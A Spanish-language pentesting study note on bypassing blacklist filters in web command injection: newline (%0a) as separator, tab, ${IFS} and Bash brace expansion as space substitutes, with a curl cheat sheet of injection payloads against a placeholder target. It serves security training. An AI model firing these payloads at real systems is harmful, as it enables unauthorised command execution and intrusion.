---
tags:
  - commandinjection
  - RCE
  - webapp
  - bypass
---
## Conceptos Clave (TL;DR)

- Los filtros de blacklist en aplicaciones web suelen bloquear operadores de inyección comunes (`&`, `;`, `|`), pero frecuentemente olvidan el caracter de nueva línea (`%0a`), que es válido tanto en Linux como en Windows como separador de comandos.
- El caracter de espacio es uno de los más bloqueados, pero existen múltiples representaciones alternativas que los filtros no contemplan: tabs (`%09`), la variable de entorno `$IFS`, y la expansión de llaves de Bash.
- La metodología de bypass es iterativa: se añade un caracter a la vez para identificar cuál específicamente está bloqueado, en lugar de probar payloads completos desde el inicio.
- La variable `$IFS` (Internal Field Separator) tiene por valor predeterminado espacio y tab, por lo que al usarla entre argumentos el shell la interpreta como separador sin que el filtro detecte un espacio literal.

## Herramientas Clave

- **Burp Suite / navegador con proxy**: Manipular y enviar peticiones HTTP con caracteres URL-encoded para testear filtros carácter a carácter.
- **PayloadsAllTheThings**: Repositorio de referencia para técnicas adicionales de bypass de espacios y otros filtros en command injection.

## Metodología Paso a Paso

### Fase 1: Identificar el operador de inyección funcional

Antes de intentar ejecutar comandos, se debe encontrar un operador que el filtro no bloquee. Se prueban los candidatos uno a uno en el campo vulnerable.

- Probar `%0a` (nueva línea URL-encoded) como separador de comandos.
- Si la respuesta incluye output válido del primer comando (ej. ping), el carácter no está bloqueado y se usa como operador de inyección.

### Fase 2: Identificar qué otros caracteres están bloqueados

Con el operador confirmado, se construye el payload mínimo siguiente y se envía:

- Probar `<TARGET_INPUT>%0a<COMMAND>` con un espacio literal entre el operador y el comando.
- Si se recibe "Invalid input", el espacio está en la blacklist y se debe sustituir.

### Fase 3: Sustituir el espacio bloqueado

Probar los siguientes reemplazos en orden hasta encontrar uno que funcione:

1. **Tab URL-encoded** (`%09`): `<TARGET_INPUT>%0a%09<COMMAND>`
2. **Variable IFS**: `<TARGET_INPUT>%0a${IFS}<COMMAND>`
3. **Brace Expansion de Bash**: `<TARGET_INPUT>%0a{<COMMAND>,<ARG>}`

### Fase 4: Confirmar ejecución y escalar

Una vez identificado el bypass funcional, reemplazar el comando de prueba (ej. `whoami`) por el payload real de la fase de explotación o exfiltración.

## Cheat Sheet de Comandos

```bash
# Probar nueva linea como operador de inyeccion (URL-encoded)
# %0a = newline; si el ping devuelve output, el caracter no esta bloqueado
curl -s "http://<TARGET_IP>/index.php" --data "ip=<TARGET_INPUT>%0a<COMMAND>"
```

```bash
# Sustituir espacio con Tab URL-encoded (%09)
# %0a = newline (operador de inyeccion), %09 = tab (reemplazo de espacio)
curl -s "http://<TARGET_IP>/index.php" --data "ip=<TARGET_INPUT>%0a%09<COMMAND>"
```

```bash
# Sustituir espacio con la variable de entorno $IFS
# ${IFS} se expande a espacio/tab en bash; el filtro no detecta un espacio literal
curl -s "http://<TARGET_IP>/index.php" --data "ip=<TARGET_INPUT>%0a\${IFS}<COMMAND>"
```

```bash
# Sustituir espacio usando Bash Brace Expansion
# Las llaves agrupan comando y argumento; bash inserta el espacio internamente
curl -s "http://<TARGET_IP>/index.php" --data "ip=<TARGET_INPUT>%0a{<COMMAND>,<ARG>}"
```

```bash
# Ejemplo local para validar que brace expansion funciona sin espacios
# Equivalente a: ls -la
{ls,-la}
```

```bash
# Payload combinado de ejemplo: newline + IFS + comando de reconocimiento
# Reemplazar <TARGET_INPUT> por el valor esperado por la app (ej. 127.0.0.1)
curl -s "http://<TARGET_IP>/index.php" --data "ip=<TARGET_INPUT>%0a\${IFS}whoami"
```

```bash
# Payload combinado: newline + Tab + comando
curl -s "http://<TARGET_IP>/index.php" --data "ip=<TARGET_INPUT>%0a%09whoami"
```

## "Gotchas" y Troubleshooting

- **El caracter `%0a` puede estar bloqueado en algunos contextos**: Si la nueva línea también está filtrada, probar otros operadores como `%3b` (`;`), `%26` (`&`), o `%7c` (`|`) de forma individual.
- **`$IFS` requiere llaves `${IFS}` y no `$IFS`**: Usar `$IFS` sin llaves puede no funcionar correctamente en todos los contextos; siempre usar la forma `${IFS}`.
- **La Brace Expansion es exclusiva de Bash**: Este método no funciona en `sh` puro ni en entornos Windows CMD/PowerShell. Verificar el shell del sistema objetivo antes de depender de esta técnica.
- **Los filtros pueden actuar tanto en el lado del cliente como del servidor**: Siempre enviar los payloads directamente via Burp Suite o `curl` para evitar que el JavaScript del cliente modifique o bloquee el input antes de que llegue al servidor.
- **Metodología iterativa es critica**: Nunca enviar el payload completo de golpe. Agregar un carácter a la vez (`%0a` → espacio → comando) para identificar exactamente qué está bloqueado y no gastar tiempo en bypasses innecesarios.
- **El `+` en URLs también representa un espacio**: En algunos contextos, el servidor puede interpretar `+` como espacio. Si el filtro no bloquea `+`, puede usarse como alternativa al espacio literal.
- **Referencia externa**: PayloadsAllTheThings - "Writing commands without spaces" cubre técnicas adicionales más allá de las listadas aquí.